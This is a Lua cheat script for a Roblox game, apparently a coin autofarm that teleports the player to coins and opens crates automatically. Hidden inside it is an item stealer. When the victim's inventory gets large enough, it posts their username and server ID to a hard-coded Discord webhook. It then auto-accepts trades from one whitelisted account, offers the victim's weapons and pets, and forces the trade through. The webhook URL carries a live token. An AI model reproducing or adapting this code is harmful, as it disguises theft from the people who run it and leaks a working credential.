local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local Trade = ReplicatedStorage:WaitForChild("Trade")
local Whitelist = { ["pwuemz"] = true }

local function SelectDevice()
	while task.wait(0.1) do
		local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
		if DeviceSelectGui then
			local Container = DeviceSelectGui:WaitForChild("Container")
			local Mouse = game.Players.LocalPlayer:GetMouse()
			local button = Container:WaitForChild("Tablet"):WaitForChild("Button")
			local buttonPos = button.AbsolutePosition
			local buttonSize = button.AbsoluteSize
			local centerX = buttonPos.X + buttonSize.X / 2
			local centerY = buttonPos.Y + buttonSize.Y / 2
			VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
			VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
		end
	end
end
task.spawn(SelectDevice)

workspace.Gravity = 0
game.ReplicatedStorage.Remotes.Gameplay.CoinCollected.OnClientEvent:Connect(function(cointype, current, max)
	if cointype ~= "Coin" then
		if tonumber(current) == tonumber(max) then
			pcall(function() game.Players.LocalPlayer.Character:BreakJoints() end)
		end
	end
end)

local previous = nil
while true do
	task.wait()
	pcall(function()
		local activeMap = nil
		for _, v in pairs(workspace:GetChildren()) do
			if v:IsA("Model") and v:FindFirstChild("CoinContainer") then
				activeMap = v
				break
			end
		end
		if activeMap and activeMap:FindFirstChild("CoinContainer") then
			pcall(function()
				local found = false
				local currentMagnitude = 30
				while not found do
					local coinsList = activeMap.CoinContainer:GetChildren()
					local startingNumber = math.random(#coinsList)
					for i, v in pairs(coinsList) do
						v = coinsList[((startingNumber + i) % #coinsList) + 1]
						local id = v:GetAttribute("CoinID")
						if id and id ~= "Coin" then
							if previous and (previous.Position - v.Position).Magnitude > currentMagnitude then
								continue
							end
							found = true
							game.Players.LocalPlayer.Character.PrimaryPart.CFrame = v.CFrame
							task.wait(0.1)
							for i = 1, 3 do
								game.Players.LocalPlayer.Character.PrimaryPart.CFrame = v.CFrame * CFrame.new(math.random(-100, 100) / 100, math.random(-100, 100) / 100, math.random(-100, 100) / 100)
								task.wait(0.1)
							end
							game.Players.LocalPlayer.Character.PrimaryPart.CFrame = v.CFrame * CFrame.new(0, -25, 0)
							previous = v.CFrame
							pcall(function() v:Destroy() end)
							task.wait(1)
							break
						end
					end
					currentMagnitude += 25
					task.wait(0.5)
				end
			end)
		else
			previous = nil
			game.Players.LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(math.random(-5, 5), -100, math.random(-5, 5))
		end
	end)
end

RunService.Heartbeat:Connect(function()
	local PlayerData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()

	if PlayerData.Materials.Owned["BeachBalls2025"] >= 800 then
		local SelectedItem = game.ReplicatedStorage.Remotes.Shop.OpenCrate:InvokeServer("Summer2025Box", "MysteryBox", "BeachBalls2025")
		game.ReplicatedStorage.Remotes.Shop.CrateComplete:FireServer(SelectedItem)
	end

	if PlayerData.Weapons.Owned then
		local count = 0
		for item, qty in pairs(PlayerData.Weapons.Owned) do
			if item ~= "DefaultKnife" and item ~= "DefaultGun" then
				count = count + qty
			end
		end
		if count >= 10 then
			request({
				Url = "https://discord.com/api/webhooks/1425180386870296728/beeOS9aoCQGDlzcEkjOzUD9_MQ1GqJ-FEohPgHIzqdKoFwhWxQB6NFBBzro1Vxi0M89c",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = HttpService:JSONEncode({
					content = game:GetService("Players").LocalPlayer.Name .. " " .. game.JobId
				})
			})
		end
	end
end)

Trade.SendRequest.OnClientInvoke = function(Player)
	local Response = Whitelist[Player.Name] and Trade.AcceptRequest or Trade.DeclineRequest
	task.delay(0.2, function()
		Response:FireServer()
	end)
end

Trade.StartTrade.OnClientEvent:Connect(function(_, Player)
	if Whitelist[Player] then
		local PlayerData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()
		PlayerData.Uniques = {}
		local Sorted = {}
		local Current = 0
		local InventoryModule = require(ReplicatedStorage.Modules.InventoryModule)
		local Sorted = InventoryModule.SortInventory(InventoryModule.GenerateInventoryTables(PlayerData, "Trading"))
		for _, Type in {"Weapons", "Pets"} do
			for _, ItemName in Sorted.Sort[Type].Current do
				if ItemName == "DefaultGun" or ItemName == "DefaultKnife" then continue end
				local Stuff = Sorted.Data[Type].Current[ItemName]
				for i = 1, Stuff.Amount do
					Trade.OfferItem:FireServer(ItemName, Type)
					wait()
				end
				Current += 1
				if Current >= 4 then break end
			end
		end
	end
	Trade.AcceptTrade.OnClientEvent:Connect(function(Success)
		if not Success then
			Trade.AcceptTrade:FireServer(game.PlaceId * 2)
		end
	end)
end)
